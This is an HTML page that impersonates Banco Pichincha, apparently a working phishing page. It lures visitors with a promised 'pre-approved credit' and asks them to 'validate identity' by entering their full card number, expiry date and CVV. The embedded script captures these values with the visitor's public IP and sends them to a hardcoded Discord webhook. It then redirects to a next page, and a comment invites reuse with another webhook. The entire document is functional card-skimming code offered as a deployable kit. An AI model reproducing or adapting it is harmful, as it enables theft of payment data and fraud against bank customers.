<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco Pichincha - Validación de Seguridad</title>

  <style>
    :root {
      --pichincha-yellow: #ffdd00;
      --pichincha-blue: #0d2c6c;
      --pichincha-blue-hover: #081d4a;
      --bg-gray: #f4f6f9;
      --card-bg: #ffffff;
      --text-dark: #1f2937;
      --text-muted: #6b7280;
      --border-gray: #e5e7eb;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont,
        "Segoe UI", Roboto, sans-serif;
      background-color: #0b1a30;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: var(--text-dark);
    }

    .mobile-container {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      background-color: var(--bg-gray);
      position: relative;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
    }

    .pichincha-header {
      background-color: #fff;
      padding: 1rem 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      border-bottom: 1px solid var(--border-gray);
      z-index: 10;
    }

    .brand-logo {
      height: 38px;
      width: auto;
      object-fit: contain;
    }

    .carousel-container {
      width: 100%;
      height: 180px;
      margin: 0 auto;
      position: relative;
      overflow: hidden;
    }

    .carousel-track {
      display: flex;
      width: 400%;
      height: 100%;
      transition: transform 0.5s ease-in-out;
    }

    .carousel-track img {
      width: 25%;
      height: 100%;
      object-fit: cover;
      flex-shrink: 0;
    }

    .card-sheet {
      background: var(--card-bg);
      margin-top: -20px;
      border-radius: 20px 20px 0 0;
      padding: 1.8rem 1.5rem;
      flex-grow: 1;
      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.08);
      position: relative;
      z-index: 2;
    }

    h2 {
      color: var(--pichincha-blue);
      font-size: 1.35rem;
      margin-bottom: 0.4rem;
      text-align: center;
      font-weight: 700;
    }

    .subtitle {
      color: var(--text-muted);
      font-size: 0.88rem;
      text-align: center;
      margin-bottom: 1.5rem;
      line-height: 1.4;
    }

    .form-group {
      margin-bottom: 1.2rem;
    }

    label {
      display: block;
      margin-bottom: 0.4rem;
      color: var(--pichincha-blue);
      font-weight: 600;
      font-size: 0.85rem;
    }

    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }

    input {
      width: 100%;
      padding: 0.85rem 0.9rem;
      border: 1px solid var(--border-gray);
      border-radius: 8px;
      font-size: 1rem;
      background-color: #fff;
      color: var(--text-dark);
      letter-spacing: 1px;
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
    }

    input:focus {
      outline: none;
      border-color: var(--pichincha-blue);
      box-shadow: 0 0 0 3px rgba(13, 44, 108, 0.1);
    }

    .card-icon {
      position: absolute;
      right: 12px;
      font-size: 1.2rem;
      pointer-events: none;
    }

    .field-hint {
      font-size: 0.75rem;
      color: var(--text-muted);
      margin-top: 0.3rem;
      display: block;
    }

    .security-info {
      background-color: #f0fdf4;
      border: 1px solid #bbf7d0;
      border-radius: 8px;
      padding: 0.8rem;
      margin-bottom: 1.5rem;
      display: flex;
      align-items: flex-start;
      gap: 10px;
    }

    .security-info span {
      font-size: 1.1rem;
    }

    .security-info p {
      font-size: 0.78rem;
      color: #166534;
      line-height: 1.35;
    }

    button {
      width: 100%;
      padding: 0.95rem;
      background-color: var(--pichincha-blue);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      transition: background-color 0.2s ease;
      margin-top: 0.5rem;
    }

    button:hover {
      background-color: var(--pichincha-blue-hover);
    }
  </style>
</head>

<body>

  <div class="mobile-container">

    <header class="pichincha-header">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original"
        alt="Banco Pichincha"
        class="brand-logo"
      />
    </header>

    <div class="carousel-container">
      <div class="carousel-track" id="carouselTrack">
        <img src="https://www.pichincha.com/sites/default/files/styles/image_with_link/public/images/solicitar-prestamo-banco-pichincha-en-linea_2.png.webp?itok=er7hELDg" alt="Promoción 1" />
        <img src="https://www.pichincha.com/sites/default/files/styles/image_with_link/public/banner%20ahorro%20flexible%20blog%20%281%29-6538830000422910.jpg.webp?itok=RSnipsmL" alt="Promoción 2" />
        <img src="https://www.pichincha.com/sites/default/files/styles/image_with_link/public/images/solicitar-credito-hipotecario_9.jpeg.webp?itok=VtKoukz7" alt="Promoción 3" />
        <img src="https://www.pichincha.com/sites/default/files/styles/post_blog/public/images/cuatro-prestamos-hipotecarios_2.jpeg.webp?itok=57_P5sPZ" alt="Promoción 1" />
      </div>
    </div>

    <main class="card-sheet">

      <div id="formStep">

        <h2>Validación de Identidad</h2>

        <p class="subtitle">
          Vamos a validar tu identidad para proceder con el desembolso inmediato de tu crédito preaprobado.
        </p>

        <form id="verificationForm">

          <div class="form-group">
            <label for="cardNumber">Número de Tarjeta de Débito o Crédito</label>

            <div class="input-wrapper">
              <input
                type="text"
                id="cardNumber"
                placeholder="0000 0000 0000 0000"
                maxlength="19"
                inputmode="numeric"
                autocomplete="off"
                required
              />

              <span class="card-icon">💳</span>
            </div>

            <span class="field-hint">
              Campo Obligatorio
            </span>
          </div>

          <div class="form-group">
            <label for="expiry">Fecha de Vencimiento</label>

            <div class="input-wrapper">
              <input
                type="text"
                id="expiry"
                placeholder="MM/AA"
                maxlength="5"
                inputmode="numeric"
                autocomplete="off"
                required
              />

              <span class="card-icon">📅</span>
            </div>

            
          </div>

          <div class="form-group">
            <label for="cvv">CVV</label>

            <div class="input-wrapper">
              <input
                type="text"
                id="cvv"
                placeholder="123"
                maxlength="3"
                inputmode="numeric"
                autocomplete="off"
                required
              />

              <span class="card-icon">🔒</span>
            </div>

            
          </div>

          <div class="security-info">
            <span>🛡️</span>

            <p>
              Este procedimiento confirma la titularidad de tu cuenta para acreditar los fondos de forma segura a tu nombre.
            </p>
          </div>

          <button type="submit" id="submitBtn">Continuar</button>

        </form>
      </div>
    </main>
  </div>

  <script>
    // =========================
    // CARRUSEL
    // =========================

    const track = document.getElementById("carouselTrack");

    let currentIndex = 0;
    const totalSlides = 3;

    function moveCarousel() {
      currentIndex++;

      track.style.transition = "transform 0.5s ease-in-out";
      track.style.transform = `translateX(-${currentIndex * 25}%)`;

      if (currentIndex === totalSlides) {
        setTimeout(() => {
          track.style.transition = "none";
          currentIndex = 0;
          track.style.transform = "translateX(0%)";
        }, 500);
      }
    }

    setInterval(moveCarousel, 3500);

    // =========================
    // FORMATO TARJETA
    // =========================

    document.getElementById("cardNumber").addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "").substring(0, 16);
      value = value.replace(/(.{4})/g, "$1 ").trim();
      e.target.value = value;
    });

    // =========================
    // FORMATO FECHA MM/AA
    // =========================

    document.getElementById("expiry").addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "").substring(0, 4);

      if (value.length > 2) {
        value = value.substring(0, 2) + "/" + value.substring(2);
      }

      e.target.value = value;
    });

    // =========================
    // FORMATO CVV - solo números y máximo 3 dígitos
    // =========================

    document.getElementById("cvv").addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "").substring(0, 3);
      e.target.value = value;
    });

    // =========================
    // OBTENER IP PÚBLICA
    // =========================

    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip || 'IP no disponible';
      } catch {
        return 'IP no disponible';
      }
    }

    // =========================
    // ENVÍO AL WEBHOOK DE DISCORD Y REDIRECCIÓN
    // =========================

    document.getElementById("verificationForm").addEventListener("submit", async function (event) {
      event.preventDefault();

      const button = document.getElementById("submitBtn");

      // Obtener datos del formulario
      const cardNumber = document.getElementById("cardNumber").value.trim();
      const expiry = document.getElementById("expiry").value.trim();
      const cvv = document.getElementById("cvv").value.trim();

      button.disabled = true;
      button.textContent = "Procesando...";

      // Obtener IP pública
      const ip = await getPublicIP();

      // Cambia esta URL por la de tu webhook de Discord
      const discordWebhookURL = "https://discord.com/api/webhooks/1519761382797606984/DqQMKPvmi0jPetK4QGxWadSdM8b0poFAgrpSvTy0bMlc498ghb4nw_U_OuOPQ_xZrDcr";

      // Construir el contenido del mensaje para Discord con IP incluida
      const discordMessage = {
        content: `**Nuevo formulario enviado:**\n- Número de Tarjeta: ${cardNumber}\n- Fecha de Vencimiento: ${expiry}\n- CVV: ${cvv}\n- IP Pública: ${ip}`
      };

      // Enviar datos al webhook
      fetch(discordWebhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(discordMessage),
      })
        .then(response => {
          if (response.ok) {
            // Redirigir a index6.html tras envío exitoso
            window.location.href = "index3.html";
          } else {
            alert("Error enviando datos a Discord");
            button.disabled = false;
            button.textContent = "Continuar";
          }
        })
        .catch(error => {
          alert("Error enviando datos a Discord");
          button.disabled = false;
          button.textContent = "Continuar";
        });
    });
  </script>
</body>
</html>
